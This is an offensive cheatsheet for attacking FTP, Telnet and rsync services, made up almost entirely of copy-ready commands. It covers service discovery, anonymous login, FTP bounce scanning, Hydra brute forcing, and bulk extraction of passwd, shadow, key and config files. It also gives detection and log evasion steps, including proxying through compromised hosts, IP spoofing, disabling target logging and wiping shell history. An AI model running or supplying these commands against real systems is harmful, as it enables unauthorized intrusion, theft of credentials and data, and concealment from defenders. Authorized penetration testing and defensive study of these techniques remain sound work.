# Cleartext Protocols Cheatsheet

## FTP

### Service Discovery & Banner Grabbing
* Basic FTP connection: `ftp <target_ip>`
* Netcat banner grab: `echo "QUIT" \| nc <target_ip> 21`
* Nmap service detection: `nmap -sV -p 21 <target_ip>`
* Nmap with FTP-specific scripts: `nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 <target_ip>`

### Anonymous Access
* Username: `anonymous`
* Password (if needed): `anonymous@example.com` (or any other existing or non-existing email address)

### FTP Bounce Scanning
* Use FTP server as proxy for port scanning: `nmap -b anonymous:anonymous@<ftp_server> <internal_target>`

### Data Exfiltration
* Bulk recursive download: `wget -r ftp://anonymous:anonymous@<target_ip>`
* Advanced FTP client: `lftp ftp://anonymous:anonymous@<target_ip>` → `mirror <remote_path> <local_path>`

## Telnet

### Service Discovery
* Basic Telnet connection: `telnet <target_ip> 23`
* Nmap service detection: `nmap -sV -p 23 <target_ip>`
* Nmap with Telnet-specific scripts: `nmap --script telnet-brute,telnet-encryption,telnet-ntlm-info -p 23 <target_ip>`

### Port Scanning
* Scan common Telnet ports: `nmap -p 23,2223,2322,2323,8023,9999,10001 <target_ip>`
* Service detection on multiple ports: `nmap -sV -p 23,2223,2322,2323,8023,9999,10001 <target_ip>`

### Hydra
* Hydra brute force: `hydra -L usernames.txt -P passwords.txt telnet://<target_ip> -vV -t4 -I`

### Initial Reconnaissance Commands

### Session Enumeration

| Command | Description |
|---------|-------------|
| `who` | Currently logged-in users |
| `w` | System users and their processes |
| `last` | Recent login/logout history |
| `users` | List of current usernames |
| `tty` | Current terminal name |
| `ps -t $(tty)` | Processes running on current terminal |

### Session Cleanup

| Command | Description |
|---------|-------------|
| `history -c` | Clear command history |
| `unset HISTFILE` | Disable history logging |
| `rm ~/.bash_history 2>/dev/null` | Remove history file |
| `unalias ls 2>/dev/null` | Remove command aliases |

## rsync

### Service Discovery
* Basic rsync service test and module listing: `rsync <target_ip>::`
* Explicit module listing: `rsync --list-only <target_ip>`
* Scan common rsync ports: `nmap -p 873,8873,9873 <target_ip>`
* Service detection: `nmap -sV -p 873 <target_ip>`

### Module Enumeration
* Detailed module information: `rsync -av --list-only <target_ip>::<module_name>`
* Test common modules
  ```bash
  for module in backup home www data etc opt var; do
    echo "Testing module: $module"
    rsync --list-only <target_ip>::$module 2>/dev/null
  done
  ```

### File Type Hunting
* Search for specific valuable file types: `rsync -avz --list-only <target_ip>::<module>/ \| grep -E '\.(conf\|cfg\|ini\|bak\|sql\|log)$'`

### Data Extraction
* Complete module mirror: `rsync -avz <target_ip>::<module>/ ./rsync_dump/`
* Selective file extraction: `rsync -avz --include="*.conf" --include="*.cfg" --exclude="*" <target_ip>::<module>/ ./configs/`
* Bandwidth-limited extraction: `rsync -avz --bwlimit=100 <target_ip>::<module>/ ./slow_dump/`

### High-Value File Extraction
```bash
rsync -avz --include="*passwd*" --include="*shadow*" --include="*config*" \
--include="*.conf" --include="*.cfg" --include="*.ini" \
--include="*.bak" --include="*.sql" --include="*.key" \
--include="*.pem" --exclude="*" <target_ip>::<module>/ ./intel/
```

### Write Access Testing
1. Create test file: `echo "rsync_test_$(date)" > test_file.txt`
2. Attempt upload: `rsync -avz test_file.txt <target_ip>::<module>`
3. Verify upload: `rsync --list-only <target_ip>::<module>/ \| grep test_file.txt`

## Detection Evasion & Operational Security

### Traffic Obfuscation

#### Timing & Bandwidth Controls
* Bandwidth limiting: `rsync -avz --bwlimit=50 --delay-updates <target>::<module>/ ./stealth_dump`
* Randomized connection intervals
  ```bash
  for i in {1..10}; do
    sleep $((RANDOM % 300 + 60))  # Random delay 1-6 minutes
    ftp -n <target> <<EOF
  user anonymous anonymous@$(date +%s)@fake.com
  ls
  quit
  EOF
  done
  ```
#### Connection Source obfuscation
* Use VPN endpoints to vary source IP addresses
* Proxy through compromised systems (if legally authorized)
* Distribute reconnaissance across multiple source addresses
* Time reconnaissance during high-traffic periods

### Log Evasion

#### FTP Log Evasion
* Use realistic email addresses for anonymous FTP (instead of anonymous@test.com use john.smith@companyname.com)
* Vary user agent strings if protocol supports them
* Mimic legitimate backup software or file transfer tools

#### General Log Evasion
```
+------------+---------------------------------------+------------------------------------------------+
| Protocol   | Common log entries                    | Minimization techniques                        |
+------------+---------------------------------------+------------------------------------------------+
| FTP        | - "USER <username>"                   | - Use FTPS (FTP over SSL/TLS)                  |
|            | - "PASS <password>"                   | - Use passive mode to avoid direct connections |
|            | - "230 Login successful"              | - Obfuscate credentials (e.g., encoded)        |
|            | - "550 Permission denied"             | - Limit connection frequency (throttle)        |
|            | - "STOR <filename> (file upload)"     | - Use non-standard ports                       |
+------------+---------------------------------------+------------------------------------------------+
| Telnet     | - "login: <username>"                 | - Replace with SSH (disables plaintext logs)   |
|            | - "password: <password>"              | - Use VPN tunneling to hide traffic            |
|            | - "Last login: <timestamp>"           | - Disable logging on target if possible        |
|            | - "Connection closed by foreign host" | - Use IP spoofing (risky)                      |
+------------+---------------------------------------+------------------------------------------------+
| rsync      | - "sent <X> bytes received <Y> bytes" | - Use SSH mode (`rsync -e ssh`)                |
|            | - "delta-transmission disabled"       | - Throttle speed (`--bwlimit`)                 |
|            | - "password file must not be other-"  | - Avoid `--password-file` (use SSH keys)       |
|            |   "readable" (auth failure)           | - Run over Tor/VPN                             |
|            | - "<file> sent/to-send"               | - Modify default port (`--port`)               |
+------------+---------------------------------------+------------------------------------------------+
```

#### Telnet Session Hygiene
* Clear command history before disconnect:
  ```bash
  history -c
  unset HISTFILE
  rm ~/.bash_history 2>/dev/null
  ```
* Avoid leaving obvious traces:
  ```bash
  unalias ls 2>/dev/null
  cd /
  ```

Reach out: https://linktr.ee/january1073
